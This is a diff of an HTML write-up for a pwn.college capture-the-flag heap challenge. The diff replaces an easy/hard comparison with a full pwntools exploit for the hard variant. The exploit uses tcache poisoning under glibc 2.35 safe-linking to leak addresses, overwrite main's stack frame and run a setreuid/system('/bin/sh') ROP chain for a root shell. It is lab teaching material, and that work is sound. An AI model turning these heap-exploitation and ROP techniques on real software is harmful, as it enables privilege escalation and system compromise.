@@ -57,9 +57,8 @@
         <h2>Overview</h2>
         <p>
           A pwn.college challenge on dynamic allocator misuse — specifically tcache poisoning under
-          glibc 2.35's safe-linking mitigation. The challenge ships in two variants (easy and hard)
-          that share the same core binary; the difference between them is a single output byte,
-          which I'll cover at the end.
+          glibc 2.35's safe-linking mitigation. This is the hard variant: no helper leaks printed
+          in the output, every address has to be derived from scratch.
         </p>
         <p>
           Coming in from the previous challenge in the series, I assumed the binary was structurally
@@ -176,8 +175,7 @@ ulong  chunk_sizes[16];  // stored sizes — not what you'd expect</code></pre>
 
         <p><strong>safe_write &lt;idx&gt;</strong> — writes <code>chunk_sizes[idx]</code> bytes
           from <code>chunks[idx]</code> to stdout via <code>fwrite</code>, then writes one
-          trailing byte, then flushes. The trailing byte is what differs between the easy and
-          hard variants.</p>
+          trailing byte (<code>\x20\n</code>), then flushes.</p>
         <p class="screenshot-todo">assets/img/writeups/heap-tcache-poison-rce/ghidra-safe-write.png — Ghidra decompiler showing the safe_write handler: both fwrite() calls and the trailing byte comment</p>
 
         <p><strong>quit</strong> — exits the loop and returns from <code>main</code>.
@@ -460,169 +458,159 @@ io.sendline(b"quit")</code></pre>
 $ id
 uid=0(root) gid=0(root) groups=0(root)</code></pre>
 
-        <h2>Hard Variant</h2>
-        <p>
-          There are two differences between easy and hard. The first is structural: the easy
-          version prints helper leak values directly in its output (addresses handed to you in
-          plaintext). The hard version removes those. I deliberately ignored the easy leaks
-          entirely and built the exploit from scratch without relying on them — otherwise the
-          easy exploit simply wouldn't port to hard, and I'd have to redo the whole thing.
-          By treating both the same from the start, adapting to hard required almost no changes.
-        </p>
-        <p>
-          The second difference is a single output byte: <code>safe_write</code> in the easy
-          version terminates its output with <code>)\n</code> (<code>\x29\x0a</code>); the hard
-          version uses <code> \n</code> (<code>\x20\x0a</code>). Every <code>recvuntil</code>
-          call before reading a leak needed to match that terminator.
-        </p>
-        <pre><code class="language-python"># easy
-io.recvuntil(b"\x29\x0a")
-
-# hard
-io.recvuntil(b"\x20\x0a")</code></pre>
-        <p>
-          The exploit hung on the first leak — <code>recvuntil</code> never found its pattern
-          and blocked indefinitely. Dumping the raw bytes from the socket made the mismatch
-          immediately obvious.
-        </p>
-
-        <h2>Full Scripts</h2>
-
-        <h3>Easy</h3>
-        <pre><code class="language-python">#!/usr/bin/python3
+        <h2>Full Script</h2>
+        <pre><code class="language-python">#!/usr/bin/env python3
 from pwn import *
 
-elf = context.binary = ELF("./tcache-terror-easy")
-libc = ELF(b"/challenge/lib/libc.so.6")
+# --- ARCH ---
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
+
+if args.GDB:
+    context.gdb_binary = 'gdb-pwndbg'
+
+exe = './tcache-terror-hard'
+elf = context.binary = ELF(exe, checksec=False)
+
+# patched to load ./ld-linux-x86-64.so.2 and ./libc.so.6 ($ORIGIN rpath)
+libc = ELF('./libc.so.6', checksec=False)
+
 context.log_level = 'debug'
 
-def start():
+gdbscript = '''
+b main
+c
+'''
+
+def start(argv=[], *a, **kw):
     if args.GDB:
-        io = process(elf.path)
-        print(f"[+] Process started with PID: {io.pid}")
-        print(f"[+] In another SSH session, run:")
-        print(f"    gdb-pwndbg -p {io.pid}")
-        input("[*] Press Enter to continue after attaching GDB...")
-        return io
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.DOJO:
+        return process(['/challenge/run'] + argv, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:
-        return process(elf.path)
+        return process([exe] + argv, *a, **kw)
 
 io = start()
 
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 0 24")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 1 24")
+PROMPT = b"[*] Function (malloc/free/safe_write/safe_read/quit): "
+
+def cmd(line):
+    io.recvuntil(PROMPT)
+    io.sendline(line)
+
+# for future use in tcache poison
+cmd(b"malloc 0 24")
+cmd(b"malloc 1 24")
 
 # leak heap
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 2 24")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"free 2")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 2 24")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_write 2")
-io.recvuntil(b"\x29\x0a")
+cmd(b"malloc 2 24")
+cmd(b"free 2")
+cmd(b"malloc 2 24")
+cmd(b"safe_write 2")
+io.recvuntil(b"\x20\x0a")
 leak = io.recv(8)
 heap_base = u64(leak) &lt;&lt; 12
+log.info(f"raw leak: {leak}")
 log.success(f"heap_base: {hex(heap_base)}")
 
 # leak libc
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 10 1048")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 3 24")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"free 10")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 10 1048")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_write 10")
-io.recvuntil(b"\x29\x0a")
+cmd(b"malloc 10 1048")
+cmd(b"malloc 3 24")  # guard
+cmd(b"free 10")
+cmd(b"malloc 10 1048")
+cmd(b"safe_write 10")
+io.recvuntil(b"\x20\x0a")
 leak = io.recv(8)
 libc.address = u64(leak) - 0x219ce0
+log.info(f"raw leak: {leak}")
 log.success(f"libc address: {hex(libc.address)}")
+log.success(f"libc.environ: {hex(libc.sym.environ)}")
 
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"free 2")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"free 1")
+# massage the heap
+cmd(b"free 2")
+cmd(b"free 1")
 
 # leak stack via tcache poison to libc.environ
-key = heap_base >> 12
+key = heap_base >> 12  # same as chunk_1 >> 12 | because is in early heap
 mangled = libc.sym.environ ^ key
-payload = flat(p64(0x22) * 3, p64(0x21), p64(mangled))
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_read 0")
+log.info(f"mangled: {hex(mangled)}")
+payload = flat(
+    p64(0x22) * 3,   # chunk_0
+    p64(0x21),        # chunk_1 size
+    p64(mangled),     # chunk_1 fd -> libc.environ
+)
+cmd(b"safe_read 0")
 io.send(payload)
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 1 24")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 2 24")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_write 2")
-io.recvuntil(b"\x29\x0a")
+cmd(b"malloc 1 24")
+cmd(b"malloc 2 24")  # points to libc.environ
+cmd(b"safe_write 2")
+io.recvuntil(b"\x20\x0a")
 leak = io.recv(8)
 stack_address = u64(leak)
-ret_address = stack_address - 0x120
-rbp_address = ret_address - 0x8
+log.info(f"raw leak: {leak}")
 log.success(f"stack_address: {hex(stack_address)}")
+ret_address = stack_address - 0x120
+# not aligned — target rbp instead
+rbp_address = ret_address - 0x8
+log.success(f"ret_address: {hex(ret_address)}")
 log.success(f"rbp_address: {hex(rbp_address)}")
 
-# leak elf base via saved return address on main's stack frame
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 0 72")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 1 72")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 2 72")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"free 2")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"free 1")
+# massage the heap
+cmd(b"malloc 0 72")
+cmd(b"malloc 1 72")
+cmd(b"malloc 2 72")
+cmd(b"free 2")
+cmd(b"free 1")
 
+# tcache poison to rbp_address
 mangled = rbp_address ^ key
-payload = flat(p64(0x22) * 9, p64(0x51), p64(mangled))
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_read 0")
+log.info(f"mangled: {hex(mangled)}")
+payload = flat(
+    p64(0x22) * 9,   # chunk_0
+    p64(0x51),        # chunk_1 size
+    p64(mangled),     # chunk_1 fd -> rbp_address
+)
+cmd(b"safe_read 0")
 io.send(payload)
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 1 72")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"malloc 2 72")
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_write 2")
-io.recvuntil(b"\x29\x0a")
-io.recv(8 * 3)
+cmd(b"malloc 1 72")
+cmd(b"malloc 2 72")  # points to rbp_address
+
+# leak elf base via saved return address on main's stack frame
+cmd(b"safe_write 2")
+io.recvuntil(b"\x20\x0a")
+io.recv(8 * 3)  # skip to the main return address
 leak = io.recv(8)
 main_address = u64(leak)
+log.info(f"raw leak: {leak}")
+log.success(f"main_address: {hex(main_address)}")
 elf.address = main_address - 0x1957
 log.success(f"elf.address: {hex(elf.address)}")
+log.success(f"libc system: {hex(libc.sym.system)}")
 
 # setreuid(0,0) + system("/bin/sh") via libc gadgets
+sys_addr = libc.sym.system
+binsh_addr = next(libc.search(b'/bin/sh'))
+setreuid_addr = libc.sym.setreuid
+
 rop = ROP(libc)
-rop.raw(rop.rdi); rop.raw(0)
-rop.raw(rop.rsi); rop.raw(0)
-rop.raw(libc.sym.setreuid)
 rop.raw(rop.rdi)
-rop.raw(next(libc.search(b'/bin/sh')))
-rop.raw(libc.sym.system)
+rop.raw(0)                  # ruid = 0
+rop.raw(rop.rsi)
+rop.raw(0)                  # euid = 0
+rop.raw(setreuid_addr)
+rop.raw(rop.rdi)
+rop.raw(binsh_addr)
+rop.raw(sys_addr)
 
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"safe_read 2")
-io.send(p64(0x0) + rop.chain())
+cmd(b"safe_read 2")
+io.send(p64(0x0) + rop.chain())   # p64(0x0) lands on saved rbp
 
-io.recvuntil(b"[*] Function (malloc/free/safe_write/safe_read/quit): ")
-io.sendline(b"quit")
+# trigger: main() returns, walks the chain
+cmd(b"quit")
 
 io.interactive()</code></pre>
-
-        <h3>Hard (diff from easy)</h3>
-        <pre><code class="language-python"># Replace every occurrence of:
-io.recvuntil(b"\x29\x0a")
-# with:
-io.recvuntil(b"\x20\x0a")</code></pre>
 
       </div>
     </article>
